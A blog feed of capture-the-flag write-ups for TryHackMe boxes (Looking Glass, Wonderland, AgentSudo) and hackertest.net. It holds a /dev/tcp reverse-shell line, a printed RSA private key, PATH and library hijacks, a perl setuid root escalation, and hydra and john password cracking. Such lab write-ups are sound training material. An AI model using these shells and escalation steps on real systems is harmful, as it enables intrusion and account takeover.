10.10.219.9Enumerationnmap nmap reveals 4993 open ports with 7 jetdirect? ports and the rest being Dropbear ssh ports… Ranging from 22 to 13999. Seems like no http port. These could be fake SSH ports? Anyways let’s try connecting to port 22. It requires a password here. Hmm seems like it’s the real port. Perhaps the clue are included in the other ports? Let’s try port 9000 Connecting to port 9000 we receive a message saying Lower. However we can’t go any lower. Recalling the name, Looking glass -&amp;gt; Lower actually means Higher. Now all we are left to do is try ssh O(log(n)) ports. Trying something in the middle: 11000: Lower -&amp;gt; Higher 12000: Higher -&amp;gt; Lower 11500: Higher -&amp;gt; Lower 11250: Higher -&amp;gt; Lower 11125: Lower -&amp;gt; Higher 11187: Lower -&amp;gt; Higher 11218: Higher -&amp;gt; Lower 11202: Lower -&amp;gt; Higher 11210: Higher -&amp;gt; Lower 11206: Lower -&amp;gt; Higher 11207 !!!! We know need to solve a puzzle.You&#39;ve found the real service.Solve the challenge to get access to the boxJabberwocky&#39;Mdes mgplmmz, cvs alv lsmtsn aowilFqs ncix hrd rxtbmi bp bwl arul;Elw bpmtc pgzt alv uvvordcet,Egf bwl qffl vaewz ovxztiql.&#39;Fvphve ewl Jbfugzlvgb, ff woy!Ioe kepu bwhx sbai, tst jlbal vppa grmjl!Bplhrf xag Rjinlu imro, pud tlnpBwl jintmofh Iaohxtachxta!&#39;Oi tzdr hjw oqzehp jpvvd tc oaoh:Eqvv amdx ale xpuxpqx hwt oi jhbkhe--Hv rfwmgl wl fp moi Tfbaun xkgm,Puh jmvsd lloimi bp bwvyxaa.Eno pz io yyhqho xyhbkhe wl sushf,Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,Pud cykdttk ej ba gaxt!Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkhEwl vpvict qseux dine huidoxt-achgb!Al peqi pt eitf, ick azmo mtd wlaeLx ymca krebqpsxug cevm.&#39;Ick lrla xhzj zlbmg vpt Qesulvwzrr?Cpqx vw bf eifz, qy mthmjwa dwn!V jitinofh kaz! Gtntdvl! Ttspaj!&#39;Wl ciskvttk me apw jzn.&#39;Awbw utqasmx, tuh tst zljxaa bdcijWph gjgl aoh zkuqsi zg ale hpie;Bpe oqbzc nxyi tst iosszqdtz,Eew ale xdte semja dbxxkhfe.Jdbr tivtmi pw sxderpIoeKeudmgdstd I thought Jabberwocky is the key but turns out it’s not. I also tried with Caesar encryption but nope. I worked with Vigenere Cipher. Set the autosolver from 10 to 20 keys worked. https://www.boxentriq.com/code-breaking/vigenere-cipher &#39;Twas brillig, and the slithy tovesDid gyre and gimble in the wabe;All mimsy were the borogoves,And the mome raths outgrabe.&#39;Beware the Jabberwock, my son!The jaws that bite, the claws that catch!Beware the Jubjub bird, and shunThe frumious Bandersnatch!&#39;He took his vorpal sword in hand:Long time the manxome foe he sought--So rested he by the Tumtum tree,And stood awhile in thought.And as in uffish thought he stood,The Jabberwock, with eyes of flame,Came whiffling through the tulgey wood,And burbled as it came!One, two! One, two! And through and throughThe vorpal blade went snicker-snack!He left it dead, and with its headHe went galumphing back.&#39;And hast thou slain the Jabberwock?Come to my arms, my beamish boy!O frabjous day! Callooh! Callay!&#39;He chortled in his joy.&#39;Twas brillig, and the slithy tovesDid gyre and gimble in the wabe;All mimsy were the borogoves,And the mome raths outgrabe.Your secret is bewareTheJabberwock We now have our secret: bewareTheJabberwock jabberwock:FlameTheseTurnedWrist SSHjabberwock@looking-glass:~$ ls -latotal 44drwxrwxrwx 5 jabberwock jabberwock 4096 Jul 3 2020 .drwxr-xr-x 8 root root 4096 Jul 3 2020 ..lrwxrwxrwx 1 root root 9 Jul 3 2020 .bash_history -&amp;gt; /dev/null-rw-r--r-- 1 jabberwock jabberwock 220 Jun 30 2020 .bash_logout-rw-r--r-- 1 jabberwock jabberwock 3771 Jun 30 2020 .bashrcdrwx------ 2 jabberwock jabberwock 4096 Jun 30 2020 .cachedrwx------ 3 jabberwock jabberwock 4096 Jun 30 2020 .gnupgdrwxrwxr-x 3 jabberwock jabberwock 4096 Jun 30 2020 .local-rw-r--r-- 1 jabberwock jabberwock 807 Jun 30 2020 .profile-rw-rw-r-- 1 jabberwock jabberwock 935 Jun 30 2020 poem.txt-rwxrwxr-x 1 jabberwock jabberwock 38 Jul 3 2020 twasBrillig.sh-rw-r--r-- 1 jabberwock jabberwock 38 Jul 3 2020 user.txtjabberwock@looking-glass:~$ cat user.txt }32a911966cab2d643f5d57d9e0173d56{mhtjabberwock@looking-glass:~$ cat user.txt | revthm{65d3710e9d75d5f346d2bac669119a23}jabberwock@looking-glass:~$ The first flag!jabberwock Linpeas.sh shows nothing really promising. There are a ton of users jabberwock@looking-glass:~$ ls /homealice humptydumpty jabberwock tryhackme tweedledee tweedledum After going through my linux privEsc check list these are the promising things:jabberwock@looking-glass:~$ sudo -lMatching Defaults entries for jabberwock on looking-glass: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser jabberwock may run the following commands on looking-glass: (root) NOPASSWD: /sbin/rebootjabberwock@looking-glass:~$ cat /etc/crontab# /etc/crontab: system-wide crontab# Unlike any other crontab you don&#39;t have to run the `crontab&#39;# command to install the new version when you edit this file# and files in /etc/cron.d. These files also have username fields,# that none of the other crontabs do.SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# m h dom mon dow user command17 * * * * root cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )#@reboot tweedledum bash /home/jabberwock/twasBrillig.shjabberwock@looking-glass:~$ cat twasBrillig.sh wall $(cat /home/jabberwock/poem.txt) We know that jabberwock can reboot as root, upon reboot tweedledum will execute twasBrillig.sh. We can modify twasBrillig.sh so it gives us a shell as tweedledum! jabberwock@looking-glass:~$ cat twasBrillig.sh bash -I &amp;gt;&amp;amp; /dev/tcp/10.2.51.175/4444 0&amp;gt;&amp;amp;1 Now run sudo reboottweedledum We’ve got a shell as tweedledum. I still need tty shell though lol.python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; Go to crackstation.net and try to crack the hash (SHA256)dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9:maybe7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed:one28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624:ofb808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f:thesefa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6:isb9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0:the5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b: The last line is unknown… I used cyberchef to crack the last one, which turns out to be a hex encoded string the password is zyxwvutsrqponmlk humptydumpty There is a poetry.txt file saying something related to alice but no other clues otherwise. Notice when ls -la /home we see some strange permission for alice. humptydumpty@looking-glass:/home/alice$ ls -la /homels -la /hometotal 32drwxr-xr-x 8 root root 4096 Jul 3 2020 .drwxr-xr-x 24 root root 4096 Jul 2 2020 ..drwx--x--x 6 alice alice 4096 Jul 3 2020 alicedrwx------ 3 humptydumpty humptydumpty 4096 Nov 27 23:06 humptydumptydrwxrwxrwx 6 jabberwock jabberwock 4096 Nov 27 22:23 jabberwockdrwx------ 5 tryhackme tryhackme 4096 Jul 3 2020 tryhackmedrwx------ 3 tweedledee tweedledee 4096 Jul 3 2020 tweedledeedrwx------ 2 tweedledum tweedledum 4096 Jul 3 2020 tweedledum But we can’t run command there. Let’s try something else. Notice every folder has these file, let’s try to enumerate those of Alice.humptydumpty@looking-glass:~$ ls -lals -latotal 28drwx------ 3 humptydumpty humptydumpty 4096 Nov 27 23:06 .drwxr-xr-x 8 root root 4096 Jul 3 2020 ..lrwxrwxrwx 1 root root 9 Jul 3 2020 .bash_history -&amp;gt; /dev/null-rw-r--r-- 1 humptydumpty humptydumpty 220 Jul 3 2020 .bash_logout-rw-r--r-- 1 humptydumpty humptydumpty 3771 Jul 3 2020 .bashrcdrwx------ 3 humptydumpty humptydumpty 4096 Nov 27 23:06 .gnupg-rw-r--r-- 1 humptydumpty humptydumpty 807 Jul 3 2020 .profile-rw-r--r-- 1 humptydumpty humptydumpty 3084 Jul 3 2020 poetry.txt Nothing’s different in those files… Hmm? Maybe alice has an .ssh folder? Correct, now we got alice’s id_rsa -----BEGIN RSA PRIVATE KEY-----MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmDNIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ2xrdnyxdwbtiKP1L4bq/4vU3OUcA+aYHxqhyq39arpeceHVit+jVPriHiCA73k7gHCgpkwWczNa5MMGo+1Cg4ifzffv4uhPkxBLLl3f4rBf84RmuKEEy6bYZ+/WOEgHlfks5ngFniW7x2R3vyq7xyDrwiXEjfW4yYe+kLiGZyyk1ia7HGhNKpIRufPdJdT+rNGrjYFLjhzeWYBmHx7JkhkEUFIVx6ZV1y+gihQIDAQABAoIBAQDAhIA5kCyMqtQjX2F+O9J8qjvFzf+GSl7lAIVuC5Ryqlxm5tsg4nUZvlRgfRMpn7hJAjD/bWfKLb7j/pHmkU1C4WkaJdjpZhSPfGjxpK4UtKx3Uetjw+1eomIVNu6pkivJ0DyXVJiTZ5jFql2PZTVpwPtRw+RebKMwjqwo4k77Q30r8Kxr4UfX2hLHtHT8tsjqBUWrb/jlMHQOzmU73tuPVQSESgeUP2jOlv7q5toEYieoA+7ULpGDwDn8PxQjCF/2QUa2jFalixsKWfEcmTnIQDyOFWCbmgOvik4Lzk/rDGn9VjcYFxOpuj3XH2l8QDQ+GO+5BBg38+aJcUINwh4BAoGBAPdctuVRoAkFpyEofZxQFqPqw3LZyviKena/HyWLxXWHxG6ji7aWDmtVXjjQOwcjOLuDkT4QQvCJVrGbdBVGOFLoWZzLpYGJchxmlR+RHCb40pZjBgr58bjJlQcp6pplBRCF/OsG5ugpCiJsS6uA6CWWXe6WC7r7V94r5wzzJpWBAoGBAM1RaCg1/2UxIOqxtAfQ+WDxqQQuq3szvrhep22McIUe83dh+hUibaPqR1nYy1sAAhgywJohLchlq4E1LhUmTZZquBwviU73fNRbID5pfn4LKL6/yiF/GWd+Zv+t9n9DDWKiWgT9aG7N+TP/yimYniR2ePu/xKIjWX/uSs3rSLcFAoGBAOxvcFpM5Pz6rD8jZrzsSFexY9P5nOpn4ppyICFRMhIfDYD7TeXeFDY/yOnhDyrJXcbOARwjivhDLdxhzFkxX1DPyif292GTsMC4xL0BhLkziIY6bGI9efC4rXvFcvrUqDyc9ZzoYflykL9KaCGr+zlCOtJ8FQZKjDhOGnDkUPMBAoGBAMrVaXiQH8bwSfyRobE3GaZUFw0yreYAsKGjoPPwkhhxA0UlXdITOQ1+HQ79xagY0fjl6rBZpska59u1ldj/BhdbRpdRvuxsQr3naGs//N64V4BaKG3/CjHcBhUA30vKCicvDI9xaQJOKardP/Ln+xM6lzrdsHwdQAXKe8wCbMuhAoGBAOKy5OnaHwB8PcFcX68srFLX4W20NN6cFp12cU2QJy2MLGoFYBpadLnK/rW4O0JxgqIV69MjDsfRn1gZNhTTAyNnRMH1U7kUfPUB2ZXCmnCGLhAGEbY9k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0-----END RSA PRIVATE KEY----- Let’s try ssh with alice’s private key.┌──(kali㉿kali)-[~/Desktop/thm/looking-glass]└─$ nano alice 1 ⨯ ┌──(kali㉿kali)-[~/Desktop/thm/looking-glass]└─$ chmod 600 alice ┌──(kali㉿kali)-[~/Desktop/thm/looking-glass]└─$ ssh -i alice alice@10.10.219.9Last login: Fri Jul 3 02:42:13 2020 from 192.168.170.1alice@looking-glass:~$ alice Browsing around, there is literally nothing I can see… Again! Try linpeas.sh, because I’m pretty manual inspection-wise I didn’t miss anything hmm.. After several tools of enumeration (linpeas was not working correctly, use linux smart enumeration instead), you will eventually found out how to read the sudoer files alice@looking-glass:~$ cd /etc/sudoers.dalice@looking-glass:/etc/sudoers.d$ lsREADME alice jabberwock tweedlesalice@looking-glass:/etc/sudoers.d$ ls -latotal 24drwxr-xr-x 2 root root 4096 Jul 3 2020 .drwxr-xr-x 91 root root 4096 Nov 27 22:40 ..-r--r----- 1 root root 958 Jan 18 2018 README-r--r--r-- 1 root root 49 Jul 3 2020 alice-r--r----- 1 root root 57 Jul 3 2020 jabberwock-r--r----- 1 root root 120 Jul 3 2020 tweedlesalice@looking-glass:/etc/sudoers.d$ cat alicealice ssalg-gnikool = (root) NOPASSWD: /bin/bashalice@looking-glass:/etc/sudoers.d$ cat alicealice ssalg-gnikool = (root) NOPASSWD: /bin/bashalice@looking-glass:/etc/sudoers.d$ sudo -h ssalg-gnikool -lsudo: unable to resolve host ssalg-gnikoolMatching Defaults entries for alice on ssalg-gnikool: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser alice may run the following commands on ssalg-gnikool: (root) NOPASSWD: /bin/bashalice@looking-glass:/etc/sudoers.d$ sudo -h ssalg-gnikool /bin/bashsudo: unable to resolve host ssalg-gnikoolroot@looking-glass:/etc/sudoers.d# We’ve got root! thm{bc2337b6f97d057b01da718ced6ead3f} Final Words: Another pretty interesting and hard box. Really challenge your PrivEsc and Enumeration skill!" }, { "title": "[TryHackMe] Wonderland", "url": "/posts/TryHackMe-Wonderland/", "categories": "CTF, Write Up", "tags": "ctf, write-up, tryhackme, wonderland, thm", "date": "2021-11-21 17:00:00 -0700", "snippet": "IP: 10.10.143.221EnumerationGobuster Nothing special…┌──(kali㉿kali)-[~/Desktop/thm/wonderland]└─$ gobuster dir --url 10.10.143.221 -w /opt/seclists/Discovery/Web-Content/common.txt 1 ⨯===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.143.221[+] Method: GET[+] Threads: 10[+] Wordlist: /opt/seclists/Discovery/Web-Content/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2021/11/21 17:53:24 Starting gobuster in directory enumeration mode===============================================================/img (Status: 301) [Size: 0] [--&amp;gt; img/]/index.html (Status: 301) [Size: 0] [--&amp;gt; ./] /r (Status: 301) [Size: 0] [--&amp;gt; r/] /render/https://www.google.com (Status: 301) [Size: 0] [--&amp;gt; /render/https:/www.google.com] ===============================================================2021/11/21 17:54:50 Finished===============================================================Nmap We need to gain some information before SSH I think.┌──(kali㉿kali)-[~/Desktop/thm/wonderland]└─$ sudo nmap -p- -sV -sS 10.10.143.221 | tee nmap.txt[sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-21 17:51 ESTNmap scan report for 10.10.143.221Host is up (0.18s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 904.22 secondsOthers: OWASP ZAP crawling doesn’t return anything useful. exif &amp;amp; binwalk the pictures in the /img/ directories. Next steps: Actually, I went to IP/r and there is some other texts! Eventually I got to IP/r/a/b/b/i/t I tried to gobuster it a bit more but seems like it’s the end. Inspecting the web page you receive what possibly be the SSH credentials! &amp;lt;p style=&quot;display: none;&quot;&amp;gt;alice:HowDothTheLittleCrocodileImproveHisShiningTail&amp;lt;/p&amp;gt; alice:HowDothTheLittleCrocodileImproveHisShiningTailSSHAlicealice@wonderland:~$ ls -latotal 40drwxr-xr-x 5 alice alice 4096 Nov 21 23:20 .drwxr-xr-x 6 root root 4096 May 25 2020 ..lrwxrwxrwx 1 root root 9 May 25 2020 .bash_history -&amp;gt; /dev/null-rw-r--r-- 1 alice alice 220 May 25 2020 .bash_logout-rw-r--r-- 1 alice alice 3771 May 25 2020 .bashrcdrwx------ 2 alice alice 4096 May 25 2020 .cachedrwx------ 3 alice alice 4096 May 25 2020 .gnupgdrwxrwxr-x 3 alice alice 4096 May 25 2020 .local-rw-r--r-- 1 alice alice 807 May 25 2020 .profile-rw------- 1 root root 66 May 25 2020 root.txt-rw-r--r-- 1 root root 3577 May 25 2020 walrus_and_the_carpenter.py Nothing major concern even after running linpeas since most exploit requires gcc.alice@wonderland:~$ sudo -lMatching Defaults entries for alice on wonderland: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser alice may run the following commands on wonderland: (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py So you can run the walrus file with rabbit privilege but you can’t edit the file. Hmm. Notice that the file import random. Running locate random.py points to the python library folder but we don’t have any permission to edit the file there either. How about we create our random.py that spawn a shell? That way we can have a shell under rabbit. alice@wonderland:~$ touch random.pyalice@wonderland:~$ echo &quot;import os; os.system(&#39;/bin/sh&#39;)&quot; &amp;gt; random.py Notice that these 3 commands don’t work. Silly me, I should have use the EXACT command that sudo -l tells us to use.# NOT WORKINGalice@wonderland:~$ sudo -u rabbit python3 walrus_and_the_carpenter.py Sorry, user alice is not allowed to execute &#39;/usr/bin/python3 walrus_and_the_carpenter.py&#39; as rabbit on wonderland.alice@wonderland:~$ sudo -u rabbit /usr/bin/python3 walrus_and_the_carpenter.py Sorry, user alice is not allowed to execute &#39;/usr/bin/python3 walrus_and_the_carpenter.py&#39; as rabbit on wonderland.alice@wonderland:~$ sudo -u rabbit /usr/bin/python3 /home/alice/walrus_and_the_carpenter.py Sorry, user alice is not allowed to execute &#39;/usr/bin/python3 /home/alice/walrus_and_the_carpenter.py&#39; as rabbit on wonderland This one will work.alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py $ whoamirabbitRabbit You will see an executable call teaParty. However you can’t examine it here because we lack tools. Notice it also has SUID and SGID bit set. Sending the file to our box using netcat. (SCP won’t work because you don’t know rabbit’s password). Tutorial https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/ # On our box:nc -l -p 4444 &amp;gt; teaParty# On wonderland:nc -w 3 10.2.51.175 4444 &amp;lt; teaParty Content of teaParty:void main(void){ setuid(0x3eb); setgid(0x3eb); puts(&quot;Welcome to the tea party!\\nThe Mad Hatter will be here soon.&quot;); system(&quot;/bin/echo -n \\&#39;Probably by \\&#39; &amp;amp;&amp;amp; date --date=\\&#39;next hour\\&#39; -R&quot;); puts(&quot;Ask very nicely, and I will give you some tea while you wait for him&quot;); getchar(); puts(&quot;Segmentation fault (core dumped)&quot;); return;} Notice that while echo uses a path, date doesn’t. We can probably hijack this.$ echo &quot;/bin/bash&quot; &amp;gt; date$ chmod 777 date$ ls -la date-rwxrwxrwx 1 rabbit rabbit 10 Nov 22 00:49 date$ export PATH=/home/rabbit:$PATH$ echo $PATH/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin$ ./teaPartyWelcome to the tea party!The Mad Hatter will be here soon.Probably by hatter@wonderland:/home/rabbit$ Hatterhatter@wonderland:/home/hatter$ ls -latotal 28drwxr-x--- 3 hatter hatter 4096 May 25 2020 .drwxr-xr-x 6 root root 4096 May 25 2020 ..lrwxrwxrwx 1 root root 9 May 25 2020 .bash_history -&amp;gt; /dev/null-rw-r--r-- 1 hatter hatter 220 May 25 2020 .bash_logout-rw-r--r-- 1 hatter hatter 3771 May 25 2020 .bashrcdrwxrwxr-x 3 hatter hatter 4096 May 25 2020 .local-rw-r--r-- 1 hatter hatter 807 May 25 2020 .profile-rw------- 1 hatter hatter 29 May 25 2020 password.txthatter@wonderland:/home/hatter$ cat password.txt WhyIsARavenLikeAWritingDesk?hatter@wonderland:/home/hatter$ sudo -l[sudo] password for hatter: Sorry, user hatter may not run sudo on wonderland. So now we are provide with a password for Hatter. But we can’t run sudo. Last is Capabilities privesc. Checked my notes &amp;amp; GTFObins ;) hatter@wonderland:~$ getcap -r / 2&amp;gt;/dev/null/usr/bin/perl5.26.1 = cap_setuid+ep/usr/bin/mtr-packet = cap_net_raw+ep/usr/bin/perl = cap_setuid+ephatter@wonderland:~$ perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#39;# whoamirootroot# cd alice# cat root.txt thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}# cat /root/user.txtthm{&quot;Curiouser and curiouser!&quot;}" }, { "title": "[hackertest.net] Write Up", "url": "/posts/Hackertest/", "categories": "CTF, Write Up, Wargame", "tags": "ctf, write-up, hackertest", "date": "2021-11-20 23:00:00 -0700", "snippet": "Link: http://www.hackertest.net/Level 2 Inspecting element you can see the check check() function.{var a=&quot;null&quot;;function check(){if (document.a.c.value == a){document.location.href=&quot;http://www.hackertest.net/&quot;+document.a.c.value+&quot;.htm&quot;;}else{alert (&quot;Try again&quot;);}}} Notice that variable a is the STRING &#39;null&#39;. Javascript’s null is just null. Password is null. Level 3 Inpectvar pass, i;pass=prompt(&quot;Please enter password!&quot;,&quot;&quot;);if (pass==&quot;l3l&quot;) {window.location.href=&quot;http://www.hackertest.net/&quot;+pass+&quot;.htm&quot;;i=4;} The password is hardcoded as l3lLevel 4function pass() { var pw, Eingabe; pw = window.document.alinkColor; Eingabe = prompt(&quot;Please enter password&quot;); if (Eingabe == pw) { window.location.href = String.fromCharCode(97, 98, 114, 97, 101) + &quot;.htm&quot;; } else { alert(&quot;Try again&quot;); }} Type window.document.alinkColor in the browser’s Console, you see the password is #000000Level 5 You will be redirected to another page. This page disables right click. So you have to use the shortcut to open the Console (Ctrl+Shift+K for Firefox and Ctrl+Shift+J for Chrome). But it also disable inspecting. After turn off the page from reloading -&amp;gt; It finally shows. var pass, i;pass = prompt(&quot;Password: &quot;, &quot;&quot;);if (pass == &quot;SAvE-as hELpS a lOt&quot;) { window.location.href = &quot;save_as.htm&quot;; i = 4;} else { alert(&quot;Try again&quot;); window.location.href = &quot;abrae.htm&quot;;} SAvE-as hELpS a lOtLevel 6 Nothing in the &amp;lt;script&amp;gt; tags like before. But the file does referring to a JS called psswd.js Go to http://www.hackertest.net/psswd.js you will see the password. (Alternatively) You can save the webpage. Using Save-As. hackertestz Level 7 The form send a request to /pwd2.php. I tried intercept it with Burp to inspect but nothing strange was happening. The php file has nothing to show. The level name is included. So I inspect the HTML again (By viewing page source). Found &amp;lt;body bg=&quot;images/included.gif&quot;&amp;gt; Go to this address http://www.hackertest.net/images/included.gif you will see the credentials. phat:jerkybar3 Level 8 This level is weird. Not in a good way. Go to /image/phat.gif. There a hint: Look for a .PhotoShop Document Change to /image/phat.psd. You will download a file. Open with GIMP. Turn off all the watermark layers, you will see the credentials. zadmin:stebbins Level 9 Crack the password. Inspecting the HTML you will see the string Z2F6ZWJydWg= in the comment. Base64 decode to gazebruh. Go to /gazebruh.php -&amp;gt; Our level 10. Level 10 Nothing special when looking and browsing through the source code. There are however weird italic words Combined them you got Shackithalf. I tried this but it not working. Turned out, lowercase -_- shackithalf Level 11 Again looking closely at the source code you will see clipart.phpLevel 12 Grab the global picture and zoom in SUPER CLOSE. puta.phpLevel 13 This time the picture is Level 13. Download it and zoom close, will see 4xml Go to 4xml.php Level 14 Download the bidvertiser.gif and use GIMP. The first layer is TOTALLY!!! php totally.php Level 15 Before I went down the rabbit hole why the image is not printing, xxd pass2level16.jpg return:┌──(kali㉿kali)-[~/Downloads]└─$ xxd pass2level16.jpg 1 ⨯00000000: ffd8 ffe0 2010 4a46 4946 2001 0220 2064 .... .JFIF .. d00000010: 2064 2020 ffec 2011 4475 636b 7920 0120 d .. .Ducky . 00000020: 0420 2020 5020 20ff ee20 0e41 646f 6265 . P .. .Adobe00000030: 2064 c020 2020 01ff db20 8420 0202 0202 d. ... . ....00000040: 0202 0202 0202 0302 0202 0304 0302 0203 ................00000050: 0405 0404 0404 0405 0605 0505 0505 0506 ................00000060: 0607 0708 0707 0609 090a 0a09 090c 0c0c ................00000070: 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c 0103 0303 ................00000080: 0504 0509 0606 090d 0b09 0b0d 0f0e 0e0e ................00000090: 0e0f 0f0c 0c0c 0c0c 4c65 7665 6c20 3136 ........Level 16000000a0: 3a20 756e 6176 6169 6c61 626c 650f 0f0c : unavailable...000000b0: 0c0c 0c0c 0c0f 0c0c 0c0c 0c0c 0c0c 0c0c ................000000c0: 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c 0c0c ................000000d0: 0c0c ffc0 2011 0820 0f20 0f03 0111 2002 .... .. . .... .000000e0: 1101 0311 01ff c420 4b20 0101 2020 2020 ....... K .. 000000f0: 2020 2020 2020 2020 2020 2009 0101 2020 ... 00000100: 2020 2020 2020 2020 2020 2020 2020 1001 ..00000110: 2020 2020 2020 2020 2020 2020 2020 2020 00000120: 1101 2020 2020 2020 2020 2020 2020 2020 .. 00000130: 2020 ffda 200c 0301 2002 1103 1120 3f20 .. ... .... ? 00000140: bf80 2020 3fff d9 .. ?.. Tried /unavailable.php not working But trying /unavailable take me to level 16! Level 16 Try going to hackertest.net/images but got a nice try ;) Go to hackertest.net/unavailable/images you will got a bg.jpg file. xxd bg.jpg will return a big chunk. If you scroll to the top, you will see Ducky.php Level 17 The url is hackertest.net/unavailable/ducky.php Inspect the source code: &amp;lt;font color=&quot;#FFFFFF&quot;&amp;gt;Password: your IP address&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;Level 18 The url is hackertest.net/level18.shtml Hey somehow your Console is blocking the password LOL. /level19.shtml Level 19 There is a file call level20_pass.gif Download and open it with GIMP You will see gazebruh2. Go to hackertest.net/gazebruh2.htm Level 20 The first long string is ASCII encoded message of saying congratulation. The second long string is a multi-base64-encoded string. You will get streetkorner.net/gb I went there but there were nothing. However, inspecting the source code, you will see a hint. ^^^^^^^^^^ Change domain, add “22332” at the end, reach it and then get hold of … ^^^^^^^^^^ So go to hackertest.net/gb22332 It said 505 but the actual status code is 200 Go to hackertest.net/505 It said 403, but again go to hackertest.net/505/403 It said What is the answer to life, the universe, and everything? If you google this it will return 42 hmmm… In the inspector, it also said you should add extension to that. I tried hackertest.net/505/403/42.xxx but none was working. Turn out it was hackertest.net/42.php LOL Done! You will get the secret code of seoJimWseo! " }, { "title": "[TryHackMe] AgentSudo", "url": "/posts/TryHackMe-AgentSudo/", "categories": "CTF, Write Up", "tags": "ctf, write-up, tryhackme, agent-sudo, thm", "date": "2021-11-20 17:00:00 -0700", "snippet": "IP: http://10.10.239.92/Task 2: EnumerateHow many open ports? nmap scan┌──(root💀kali)-[/home/kali/Desktop/thm/agent-sudo]└─# nmap -sS -sV -p- 10.10.239.92 | tee nmap.txt Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-20 17:42 ESTNmap scan report for 10.10.239.92Host is up (0.18s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 827.24 seconds 3 open ports.How you redirect yourself to a secret page? When you go to the website, it said Use your own codename as user-agent to access the site. user-agent What is the Agent’s name? I parse the request to Burp’s repeater. Not sure where to look for agent name, but in the hint, it said that try with User-Agent: C We are redirected to agent_C_attention.php Agent name is chris Task 3: Hash cracking and brute-forceFTP Passwordhydra -t 30 -l chris -P /usr/share/wordlists/rockyou.txt -vV 10.10.239.92 ftp FTP: chris:crystalZip file password We have 2 pictures and a txt file but no zip files. May be it is embedded in the pictures! ┌──(root💀kali)-[/home/kali/Desktop/thm/agent-sudo]└─# binwalk -e cutie.png DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 PNG image, 528 x 528, 8-bit colormap, non-interlaced869 0x365 Zlib compressed data, best compression34562 0x8702 Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt34820 0x8804 End of Zip archive, footer length: 22 Taada! A zip file. But it is password protected. It is located in your extracted folder, 8702.zip We are gonna crack it using JohnTheRipper. Googling around shows me how. $ zip2john 8702.zip &amp;gt; 8702.hash┌──(root💀kali)-[/home/…/Desktop/thm/agent-sudo/_cutie.png.extracted]└─# john 8702.hash --wordlist=/usr/share/wordlists/rockyou.txt 1 ⨯Using default input encoding: UTF-8Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])Cost 1 (HMAC size) is 78 for all loaded hashesWill run 5 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusalien (8702.zip/To_agentR.txt) 1g 